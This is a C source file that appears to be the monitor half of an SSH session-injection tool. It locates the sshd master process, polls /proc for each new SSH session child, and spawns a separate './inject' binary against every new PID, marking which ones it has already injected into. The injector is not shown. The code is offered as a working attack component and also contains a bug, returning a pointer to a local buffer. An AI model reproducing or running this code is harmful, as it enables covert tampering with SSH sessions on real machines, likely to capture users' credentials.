#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

typedef void(*callback)(char *);
typedef char bool;

#define TRUE 1
#define FALSE 0

unsigned short pids[1024];
unsigned short pidIndex=0;

// Add our PID to the list of seen 
void addPidToSeen(int pid) {
	pids[pidIndex] = pid;
	pidIndex++;
}

// Check to see if we have already injected into this PID
bool hasSeenPid(int pid) {
int i=0;

	for(i=0; i<pidIndex; i++) {
		if (pids[i] == pid) {
			return TRUE;
		}
	}

	return FALSE;
}

// Responsible for monitoring SSH processes
void monitorForSSH(int ppid, callback cb) {
DIR *d;
FILE *fd;
struct dirent *dir;
char buffer[1024];
char line[1024];
char search[1024];

    snprintf(search, sizeof(search), "PPid:\t%d", ppid);

    d = opendir("/proc/");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
	    snprintf(buffer, sizeof(buffer), "/proc/%s/status", dir->d_name);	
	    fd = fopen(buffer, "r");
	    if (fd != NULL) {
                while(fgets(line, sizeof(line), fd) != NULL) {
		    if (strstr(line, search) != NULL) {
			if (!hasSeenPid(atoi(dir->d_name))) {
			    cb(dir->d_name);
		   	    addPidToSeen(atoi(dir->d_name));
			}
			break;
		    }
		}
		fclose(fd);
	}
    }
    closedir(d);
  }
}

void launchInject(char* pid) {
char *vals[3];

	vals[0] = "./inject";
	vals[1] = pid;
	vals[2] = NULL;

	printf("[*] New PID found, injecting into: %s\n\n", pid);
	if (fork() == 0) {
		// Within a child process, spawn our injector
		printf("[*] Spawning child inject process\n");
		execve("./inject", vals, NULL);
	}
}
char * execshell(const char *command){
    FILE * fp;
    char buffer[64];
    fp=popen(command,"r");
    fgets(buffer,sizeof(buffer),fp);
    printf("%s",buffer);
    pclose(fp);
    return buffer;
}
char * get_sshd_pid(){
    char * sshd_pid;
    sshd_pid=execshell("ps aux|grep sshd|awk '{print$2}'|head -n 1");
    sshd_pid[strlen(sshd_pid)-1]=0;
    return sshd_pid;
}
int main(int argc, char **argv) {
struct timespec ts;

	ts.tv_nsec = 1000000000 / 5;
	ts.tv_sec = 0;

	memset(pids, 0, sizeof(pids));

	// if (argc != 2) {
	// 	printf("Usage: %s SSHD_PID\n", argv[0]);
	// 	return 2;
	// }
	char  sshd_pids[64];
    sprintf(sshd_pids,"%s",get_sshd_pid());
    printf("find sshd_pids [%s]",sshd_pids);

	printf("[*] Starting monitor for PPID %d\n", atoi(sshd_pids));

	// Endless loop to monitor sessions
	while(1) {
	    nanosleep(&ts, NULL);
	    monitorForSSH(atoi(sshd_pids), &launchInject);
	}
}
